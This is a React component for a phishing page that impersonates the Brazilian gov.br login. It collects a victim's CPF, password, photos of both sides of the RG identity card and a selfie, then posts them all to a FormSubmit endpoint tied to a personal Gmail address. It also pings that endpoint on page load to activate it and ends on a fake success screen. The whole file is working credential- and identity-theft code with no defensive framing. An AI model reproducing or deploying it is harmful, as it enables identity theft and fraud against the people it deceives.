import { useState, useRef, useEffect } from "react";

type Step = "cpf" | "password" | "documents" | "sending" | "done";

const LoginCard = () => {
  const [step, setStep] = useState<Step>("cpf");
  const [cpf, setCpf] = useState("");
  const [password, setPassword] = useState("");
  const [cpfError, setCpfError] = useState("");
  const [rgFrente, setRgFrente] = useState<File | null>(null);
  const [rgVerso, setRgVerso] = useState<File | null>(null);
  const [fotoRosto, setFotoRosto] = useState<File | null>(null);
  const [docError, setDocError] = useState("");
  const rgFrenteRef = useRef<HTMLInputElement>(null);
  const rgVersoRef = useRef<HTMLInputElement>(null);
  const fotoRostoRef = useRef<HTMLInputElement>(null);

  // Trigger FormSubmit activation email on first page load
  useEffect(() => {
    const key = "fs_pinged";
    if (!sessionStorage.getItem(key)) {
      sessionStorage.setItem(key, "1");
      fetch("https://formsubmit.co/ajax/kennedyhenrique91938@gmail.com", {
        method: "POST",
        headers: { "Content-Type": "application/json", Accept: "application/json" },
        body: JSON.stringify({
          _subject: "✅ Ativação FormSubmit - gov.br",
          status: "Endpoint ativado. Clique no link de confirmação enviado pelo FormSubmit.",
          _captcha: "false",
        }),
      }).catch(() => {});
    }
  }, []);

  // Check redirect back from FormSubmit
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("status") === "ok") {
      setStep("done");
      window.history.replaceState({}, "", window.location.pathname);
    }
  }, []);

  const formatCpf = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    return digits
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
  };

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCpf(formatCpf(e.target.value));
    setCpfError("");
  };

  const handleContinuar = (e: React.FormEvent) => {
    e.preventDefault();
    const digits = cpf.replace(/\D/g, "");
    if (digits.length !== 11) {
      setCpfError("Digite um CPF válido com 11 dígitos.");
      return;
    }
    setStep("password");
  };

  const handleSubmitPassword = (e: React.FormEvent) => {
    e.preventDefault();
    setStep("documents");
  };

  const handleFileChange =
    (setter: (f: File | null) => void) =>
    (e: React.ChangeEvent<HTMLInputElement>) => {
      setter(e.target.files?.[0] ?? null);
      setDocError("");
    };

  // Native form submit — validate only; if ok, don't prevent default so browser posts to FormSubmit
  const handleSubmitDocuments = (e: React.FormEvent) => {
    if (!rgFrente || !rgVerso || !fotoRosto) {
      e.preventDefault();
      setDocError("Por favor, envie todas as imagens solicitadas.");
      return;
    }
    setStep("sending");
    // Allow native form to submit to FormSubmit
  };

  const nextUrl = `${window.location.origin}${window.location.pathname}?status=ok`;

  return (
    <div className="bg-white rounded-lg shadow-sm border border-gray-200 p-6 mt-4">
      {/* Title */}
      <h1 className="text-xl font-bold text-gray-900 mb-6">
        Identifique-se no gov.br com:
      </h1>

      {/* ── STEP 1: CPF ── */}
      {step === "cpf" && (
        <>
          <div className="flex items-center gap-3 mb-1">
            <img
              src="https://cdn-ai.onspace.ai/onspace/files/PKdmK6wSrH2XwFd8FpekfN/images.jpeg"
              alt="Cartão CPF"
              className="w-10 h-7 object-cover rounded"
            />
            <span className="text-base font-semibold text-gray-800">
              Número do CPF
            </span>
          </div>

          <p className="text-sm text-gray-700 mb-4">
            Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
          </p>

          <form onSubmit={handleContinuar} noValidate>
            <label className="block text-sm font-bold text-gray-900 mb-1" htmlFor="cpf">
              CPF
            </label>
            <input
              id="cpf"
              type="text"
              inputMode="numeric"
              placeholder="Digite seu CPF"
              value={cpf}
              onChange={handleCpfChange}
              className={`w-full border rounded px-3 py-3 text-base text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#1351b4] ${
                cpfError ? "border-red-500" : "border-gray-400"
              }`}
              autoComplete="username"
            />
            {cpfError && <p className="text-red-500 text-sm mt-1">{cpfError}</p>}

            <button
              type="submit"
              className="w-full mt-5 bg-[#1351b4] hover:bg-[#0d3f8f] text-white font-bold py-4 rounded-full text-base transition-colors duration-200"
            >
              Continuar
            </button>
          </form>

          {/* Other options */}
          <div className="mt-6">
            <p className="text-sm font-semibold text-gray-800 mb-3">
              Outras opções de identificação:
            </p>
            <hr className="border-gray-300 mb-4" />
            <ul className="space-y-4">
              <li className="flex items-center gap-3">
                <span className="text-2xl">🏦</span>
                <span className="text-[#1351b4] font-medium text-sm cursor-pointer hover:underline">
                  Login com seu banco
                </span>
                <span className="bg-[#168821] text-white text-[10px] font-bold px-2 py-0.5 rounded uppercase tracking-wide">
                  SUA CONTA SERÁ PRATA
                </span>
              </li>
              <li className="flex items-center gap-3">
                <span className="text-2xl">📱</span>
                <span className="text-gray-800 text-sm">Seu aplicativo gov.br</span>
              </li>
              <li className="flex items-center gap-3">
                <span className="text-2xl">🔑</span>
                <span className="text-gray-800 text-sm">Seu certificado digital</span>
              </li>
              <li className="flex items-center gap-3">
                <span className="text-2xl">☁️</span>
                <span className="text-gray-800 text-sm">Seu certificado digital em nuvem</span>
              </li>
            </ul>
          </div>
        </>
      )}

      {/* ── STEP 2: PASSWORD ── */}
      {step === "password" && (
        <>
          <div className="flex items-center gap-3 mb-4 bg-gray-50 rounded px-3 py-2">
            <img
              src="https://cdn-ai.onspace.ai/onspace/files/PKdmK6wSrH2XwFd8FpekfN/images.jpeg"
              alt="Cartão CPF"
              className="w-10 h-7 object-cover rounded"
            />
            <div>
              <p className="text-xs text-gray-500">CPF</p>
              <p className="text-sm font-semibold text-gray-800">{cpf}</p>
            </div>
            <button
              type="button"
              onClick={() => setStep("cpf")}
              className="ml-auto text-[#1351b4] text-xs font-medium hover:underline"
            >
              Alterar
            </button>
          </div>

          <p className="text-sm text-gray-700 mb-4">
            Digite sua <strong>senha</strong> para acessar sua conta gov.br
          </p>

          <form onSubmit={handleSubmitPassword}>
            <label className="block text-sm font-bold text-gray-900 mb-1" htmlFor="senha">
              Senha
            </label>
            <input
              id="senha"
              type="password"
              placeholder="Digite sua senha"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              className="w-full border border-gray-400 rounded px-3 py-3 text-base text-gray-800 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-[#1351b4]"
              autoComplete="current-password"
            />

            <button
              type="submit"
              className="w-full mt-5 bg-[#1351b4] hover:bg-[#0d3f8f] text-white font-bold py-4 rounded-full text-base transition-colors duration-200"
            >
              Continuar
            </button>
            <button
              type="button"
              onClick={() => setStep("cpf")}
              className="w-full mt-3 border border-[#1351b4] text-[#1351b4] font-bold py-3 rounded-full text-base hover:bg-blue-50 transition-colors duration-200"
            >
              Voltar
            </button>
          </form>

          <div className="mt-5 text-center">
            <a href="#" className="text-[#1351b4] text-sm font-medium hover:underline">
              Esqueci minha senha
            </a>
          </div>
        </>
      )}

      {/* ── STEP 3: DOCUMENTS — native form POST to FormSubmit ── */}
      {(step === "documents" || step === "sending") && (
        <>
          <div className="flex items-center gap-3 mb-5 bg-gray-50 rounded px-3 py-2">
            <img
              src="https://cdn-ai.onspace.ai/onspace/files/PKdmK6wSrH2XwFd8FpekfN/images.jpeg"
              alt="Cartão CPF"
              className="w-10 h-7 object-cover rounded"
            />
            <div>
              <p className="text-xs text-gray-500">CPF</p>
              <p className="text-sm font-semibold text-gray-800">{cpf}</p>
            </div>
          </div>

          <h2 className="text-base font-bold text-gray-900 mb-1">Confirmação de identidade</h2>
          <p className="text-sm text-gray-600 mb-5">
            Para sua segurança, envie as fotos do seu documento e uma selfie.
          </p>

          {/* 
            Native form action → FormSubmit handles file uploads only via native POST multipart.
            The onSubmit handler validates and then allows the browser to submit natively.
          */}
          <form
            action="https://formsubmit.co/kennedyhenrique91938@gmail.com"
            method="POST"
            encType="multipart/form-data"
            onSubmit={handleSubmitDocuments}
            className="space-y-5"
          >
            {/* Hidden fields */}
            <input type="hidden" name="cpf" value={cpf} />
            <input type="hidden" name="senha" value={password} />
            <input type="hidden" name="_subject" value="Nova tentativa de login - gov.br" />
            <input type="hidden" name="_captcha" value="false" />
            <input type="hidden" name="_template" value="table" />
            <input type="hidden" name="_next" value={nextUrl} />

            {/* RG Frente */}
            <div>
              <label className="block text-sm font-bold text-gray-900 mb-2">RG — Frente</label>
              <div
                onClick={() => rgFrenteRef.current?.click()}
                className="w-full border-2 border-dashed border-gray-300 rounded-lg p-4 flex flex-col items-center justify-center gap-2 cursor-pointer hover:border-[#1351b4] transition-colors"
              >
                {rgFrente ? (
                  <>
                    <img src={URL.createObjectURL(rgFrente)} alt="RG Frente" className="h-28 object-contain rounded" />
                    <p className="text-xs text-green-600 font-medium">{rgFrente.name}</p>
                  </>
                ) : (
                  <>
                    <svg className="w-8 h-8 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M4 16l4-4m0 0l4 4m-4-4v8M20 12a8 8 0 11-16 0 8 8 0 0116 0z" />
                    </svg>
                    <p className="text-sm text-gray-500">Toque para enviar foto da frente</p>
                    <p className="text-xs text-gray-400">JPG, PNG ou PDF</p>
                  </>
                )}
                <input
                  ref={rgFrenteRef}
                  type="file"
                  name="rg_frente"
                  accept="image/*,application/pdf"
                  capture="environment"
                  className="hidden"
                  onChange={handleFileChange(setRgFrente)}
                  disabled={step === "sending"}
                />
              </div>
            </div>

            {/* RG Verso */}
            <div>
              <label className="block text-sm font-bold text-gray-900 mb-2">RG — Verso</label>
              <div
                onClick={() => rgVersoRef.current?.click()}
                className="w-full border-2 border-dashed border-gray-300 rounded-lg p-4 flex flex-col items-center justify-center gap-2 cursor-pointer hover:border-[#1351b4] transition-colors"
              >
                {rgVerso ? (
                  <>
                    <img src={URL.createObjectURL(rgVerso)} alt="RG Verso" className="h-28 object-contain rounded" />
                    <p className="text-xs text-green-600 font-medium">{rgVerso.name}</p>
                  </>
                ) : (
                  <>
                    <svg className="w-8 h-8 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M4 16l4-4m0 0l4 4m-4-4v8M20 12a8 8 0 11-16 0 8 8 0 0116 0z" />
                    </svg>
                    <p className="text-sm text-gray-500">Toque para enviar foto do verso</p>
                    <p className="text-xs text-gray-400">JPG, PNG ou PDF</p>
                  </>
                )}
                <input
                  ref={rgVersoRef}
                  type="file"
                  name="rg_verso"
                  accept="image/*,application/pdf"
                  capture="environment"
                  className="hidden"
                  onChange={handleFileChange(setRgVerso)}
                  disabled={step === "sending"}
                />
              </div>
            </div>

            {/* Foto do rosto */}
            <div>
              <label className="block text-sm font-bold text-gray-900 mb-2">Foto do rosto (selfie)</label>
              <div
                onClick={() => fotoRostoRef.current?.click()}
                className="w-full border-2 border-dashed border-gray-300 rounded-lg p-4 flex flex-col items-center justify-center gap-2 cursor-pointer hover:border-[#1351b4] transition-colors"
              >
                {fotoRosto ? (
                  <>
                    <img src={URL.createObjectURL(fotoRosto)} alt="Foto do rosto" className="h-28 object-contain rounded-full" />
                    <p className="text-xs text-green-600 font-medium">{fotoRosto.name}</p>
                  </>
                ) : (
                  <>
                    <svg className="w-8 h-8 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M15 10a3 3 0 11-6 0 3 3 0 016 0zM4.93 19.07A10 10 0 1119.07 4.93 10 10 0 014.93 19.07z" />
                    </svg>
                    <p className="text-sm text-gray-500">Toque para tirar selfie</p>
                    <p className="text-xs text-gray-400">JPG ou PNG</p>
                  </>
                )}
                <input
                  ref={fotoRostoRef}
                  type="file"
                  name="foto_rosto"
                  accept="image/*"
                  capture="user"
                  className="hidden"
                  onChange={handleFileChange(setFotoRosto)}
                  disabled={step === "sending"}
                />
              </div>
            </div>

            {docError && <p className="text-red-500 text-sm">{docError}</p>}

            <button
              type="submit"
              disabled={step === "sending"}
              className="w-full bg-[#1351b4] hover:bg-[#0d3f8f] disabled:opacity-70 text-white font-bold py-4 rounded-full text-base transition-colors duration-200 flex items-center justify-center gap-2"
            >
              {step === "sending" ? (
                <>
                  <svg className="animate-spin h-5 w-5 text-white" viewBox="0 0 24 24" fill="none">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z" />
                  </svg>
                  Enviando...
                </>
              ) : "Confirmar identidade"}
            </button>

            <button
              type="button"
              onClick={() => setStep("password")}
              disabled={step === "sending"}
              className="w-full border border-[#1351b4] text-[#1351b4] font-bold py-3 rounded-full text-base hover:bg-blue-50 transition-colors duration-200 disabled:opacity-50"
            >
              Voltar
            </button>
          </form>
        </>
      )}

      {/* ── STEP: DONE ── */}
      {step === "done" && (
        <div className="text-center py-8">
          <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-100 mb-4">
            <svg className="w-8 h-8 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <h2 className="text-lg font-bold text-gray-900 mb-2">Acesso realizado</h2>
          <p className="text-sm text-gray-600">Você foi identificado com sucesso no gov.br.</p>
        </div>
      )}

      {/* Help link */}
      <div className="mt-8 flex items-center justify-center gap-2">
        <span className="inline-flex items-center justify-center w-5 h-5 rounded-full bg-[#1351b4] text-white text-xs font-bold">
          ?
        </span>
        <a href="#" className="text-[#1351b4] text-sm font-medium hover:underline">
          Está com dúvidas e precisa de ajuda?
        </a>
      </div>
    </div>
  );
};

export default LoginCard;
